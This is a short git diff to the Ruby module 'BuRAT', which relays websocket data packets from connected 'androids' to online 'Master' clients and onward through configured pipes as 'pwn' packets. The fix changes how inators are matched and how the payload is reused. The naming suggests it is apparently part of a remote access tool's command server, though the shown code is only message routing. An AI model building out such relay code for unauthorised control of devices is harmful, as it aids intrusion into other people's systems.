@@ -46,11 +46,13 @@ module BuRAT
               packet = packet("data", payload, trailer)
               masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
               masters.each { |master| master["ws"].send(packet) }
+              #pipe
               android = @androids.find { |android| android["id"] == payload["android"] }
-              inator = android["inators"].find { |inator| inator == payload["inator"] }
+              inator = android["inators"].find { |inator| inator["code"] == payload["inator"] }
               inator["pipes"].each do |pipe|
                 android = @androids.find { |android| android["id"] == pipe["android"] }
-                payload = {"android" => android, "inator" => pipe["inator"], "data" => data}
+                payload["android"] = pipe["android"]
+                payload["inator"] = pipe["inator"]
                 packet = packet("pwn", payload, trailer)
                 android["ws"].send(packet)
               end
